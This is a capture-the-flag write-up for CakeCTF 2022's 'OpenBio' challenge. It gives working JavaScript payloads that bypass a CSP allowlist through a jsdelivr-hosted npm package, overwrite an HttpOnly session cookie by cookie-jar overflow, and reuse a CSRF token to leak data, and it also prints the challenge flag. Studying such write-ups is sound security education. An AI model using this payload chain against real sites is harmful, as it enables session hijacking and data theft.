# CTF writeup for OpenBio - CakeCTF_2022

Let's take a look at the source code. There are some APIs: register/login/logout, view/update profile, and report.
The website uses [CSP and nonce techniques](https://web.dev/csp/) to prevent XSS attack. Below is the `/profile/my_account`'s response header:
```
HTTP/1.1 200 OK
Server: nginx/1.21.6
Date: Mon, 05 Sep 2022 05:30:47 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 2451
Connection: close
Content-Security-Policy: default-src 'none';
  script-src 'nonce-uXNwZYx7W4dDz2yzdzrcAw==' https://cdn.jsdelivr.net/ https://www.google.com/recaptcha/ https://www.gstatic.com/recaptcha/ 'unsafe-eval';
  style-src https://cdn.jsdelivr.net/;
  frame-src https://www.google.com/recaptcha/ https://recaptcha.google.com/recaptcha/;
  base-uri 'none';
  connect-src 'self';
Vary: Cookie
```
So, the website only accepts scripts coming from https://cdn.jsdelivr.net/. I publish my npm package called my-npm-payload (version 1.0.0) with the content: `<script>alert(1)</script>`. Then I update my bio: `<script src="https://cdn.jsdelivr.net/npm/my-npm-payload@1.0.0"></script>`. And BOOM! The alert statement is executed.

Ok, we perfomed XSS successfully, but how to get the flag? Let's look at `crawler.js`:
```
  ...
    const username = Math.random().toString(32).substring(2);
    const password = Math.random().toString(32).substring(2);

    const browser = await puppeteer.launch(browser_option);
    try {
        const page = await browser.newPage();
        // Register
        await page.goto(base_url + '/', {timeout: 3000});
        await page.type('#username', username);
        await page.type('#password', password);
        await page.click('#tab-signup');
        await page.click('#signup');
        await wait(1000);

        // Set flag to bio
        await page.goto(base_url + '/', {timeout: 3000});
        await page.$eval('#bio', element => element.value = '');
        await page.type('#bio', "You hacked me! The flag is " + flag);
        await page.click('#update');
        await wait(1000);

        // Check spam page
        await page.goto(url, {timeout: 3000});
        await wait(3000);
        await page.close();
   ...
```
In short, it does the following things:
- First, create a user (with random username and password)
- Second, update its own bio => flag
- Finally, go to reported bio

This is my idea: When the crawler visit my bio, the executed XSS script will change **my bio** to **crawler's username**. And having crawler's username means having the flag.

## CSRF

The update profile API uses csrf_token. But I realize that with the same session cookie and one of the valid csrf_tokens, I can call update API multiple times. 

Therefore, the script should **change the crawler's session cookie to my session cookie and call update API with my csrf_token**

## Change session cookie

The session cookie is HttpOnly. There's a technique we can use to bypass this. It's [Cookie jar overflow](https://book.hacktricks.xyz/pentesting-web/hacking-with-cookies/cookie-jar-overflow). So, this is my-npm-payload (version 2.0.0):
```
for (let i = 0; i < 700; i++) {
        document.cookie = `cookie${i}=${i}`;
    }
    for (let i = 0; i < 700; i++) {
        document.cookie = `cookie${i}=${i};expires=Thu, 01 Jan 1970 00:00:01 GMT`;
    }
    document.cookie='session=<my_session_cookie>;path=/';
    
    xhr_2 = new XMLHttpRequest();
    xhr_2.open('POST', '/api/user/update');
    xhr_2.withCredentials = true;
    xhr_2.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    xhr_2.send("bio=new_bio"&csrf_token=<my_csrf_token>");
```
Note that there is `path=/` in new session cookie, because if not, the cookie will not be sent with the request on path `/profile/...`
I ran this code on console first, and it worked! Now, we will replace `new_bio` to the flag.
I modified my-npm-payload like this (version 3.0.0):
```
//send request to / => get the crawler's username
var result;
xhr = new XMLHttpRequest();
xhr.open('GET', '/');
xhr.onreadystatechange = function(){
    result = xhr.responseText;
    dom = new DOMParser();
    result_parsed = dom.parseFromString(result, 'text/html');
    title = result_parsed.title; //The title contains the crawler's username
    
    //overwrite crawler's session cookie => my session cookie
    for (let i = 0; i < 700; i++) {
        document.cookie = `cookie${i}=${i}`;
    }
    for (let i = 0; i < 700; i++) {
        document.cookie = `cookie${i}=${i};expires=Thu, 01 Jan 1970 00:00:01 GMT`;
    }
    document.cookie='session=<my_session_cookie>;path=/';
    
    //Update my bio with my csrf_token
    xhr_2 = new XMLHttpRequest();
    xhr_2.open('POST', '/api/user/update');
    xhr_2.withCredentials = true;
    xhr_2.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    xhr_2.send("bio=<script src='https://cdn.jsdelivr.net/npm/my-npm-payload@3.0.0'></script>Title:"+title+"&csrf_token=<my_csrf_token>");
}
xhr.send();
```
I have `<script src='my-npm-payload-url'></script>` in my bio's content so that when I go to my profile and click "Report", the payload will not be lost. I changed my bio: `<script src="https://cdn.jsdelivr.net/npm/my-npm-payload@3.0.0"></script>` and after reporting, I got the result:

![image](https://user-images.githubusercontent.com/103978452/188373761-51e8babe-9dbb-4479-bbe8-7686cd21cfd2.png)

Now visit `/profile/7cokbb5m2bo` and here's the flag:
'CakeCTF{httponly=true_d03s_n0t_pr0t3ct_U_1n_m4ny_c4s3s!}'

**Notes**: Somehow, this works fine on Chrome but not on Firefox. The problem is related to SameSite attribute of cookie. However, I got the flag :))
